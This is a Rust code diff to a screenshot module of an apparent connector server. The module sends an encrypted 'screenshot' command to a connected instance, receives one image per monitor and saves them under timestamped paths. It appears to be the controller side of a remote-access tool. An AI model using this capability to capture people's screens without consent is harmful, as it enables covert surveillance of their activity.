@@ -1,8 +1,9 @@
-use std::{borrow::BorrowMut, fmt::format};
+use std::{any::Any, borrow::BorrowMut, fmt::format};
 
+use chrono::{DateTime, Local};
 use tokio::fs::{self, File};
 
-use crate::connector_server::instance::Instance;
+use crate::connector_server::{instance::Instance, utils::file_util::create_file};
 
 #[derive(Debug, Clone)]
 
@@ -13,7 +14,7 @@ pub struct Screenshot {
 impl Screenshot {
     pub fn new() -> Screenshot {
         Screenshot {
-            name: "update".to_string(),
+            name: "screenshot".to_string(),
         }
     }
     pub fn get_name(&self) -> String {
@@ -23,7 +24,7 @@ impl Screenshot {
         instance
             .send_hybrid_encryption(
                 instance.get_public_key().clone(),
-                "screenshot".as_bytes().to_vec(),
+                self.name.as_bytes().to_vec(),
             )
             .await;
         let message = instance.accept_message().await;
@@ -34,16 +35,22 @@ impl Screenshot {
         let mut screenshot_files = Vec::new();
         //for each monitor create files
         for index in 0..number_of_screenshots {
-            //make it be more specific with current date or moni name
-            let path = format!("/users/{}/screenshot{index}.png", instance.get_path());
-            fs::create_dir_all(path.clone()).await.unwrap();
-            File::open(path.clone()).await.unwrap();
+            let local: DateTime<Local> = Local::now();
+            let formatted_local = local.format("%Y-%m-%d %H:%M:%S").to_string();
+            //make it be more specific with moni name
+            let path = format!(
+                "/users/screenshots/{}/screenshot{index}{formatted_local}.png",
+                instance.get_path()
+            );
+            create_file(path.as_str()).await;
             screenshot_files.push(path);
         }
         //for each monitor write in path screenshot
         for index in 0..number_of_screenshots {
             let message = instance.accept_message().await;
-            fs::write(screenshot_files.get(index as usize).unwrap(), message);
+            fs::write(screenshot_files.get(index as usize).unwrap(), message)
+                .await
+                .unwrap();
         }
     }
 }
